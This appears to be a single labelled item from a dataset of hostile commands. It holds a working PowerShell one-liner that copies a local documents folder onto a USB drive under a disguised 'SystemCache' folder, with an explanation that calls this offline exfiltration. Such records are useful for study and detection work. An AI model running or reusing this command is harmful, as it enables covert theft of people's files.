command: $dl=((Get-Disk | Where-Object BusType -eq 'USB' | Get-Partition | Where-Object DriveLetter | Get-Volume | Select-Object -First 1).DriveLetter + ':'); New-Item -Path "$dl\SystemCache" -ItemType Directory -Force | Out-Null; Copy-Item -Path "C:\Users\Public\Documents\Reports" -Destination "$dl\SystemCache" -Recurse -Force
explanation: Copies a local documents directory to a detected USB drive under a system-sounding folder, writing data to removable media for offline exfiltration.
rationale_steps: Identify a USB disk and resolve its drive letter.
Create a hidden-looking destination folder on the USB.
Recursively copy files from the local system to the USB device.
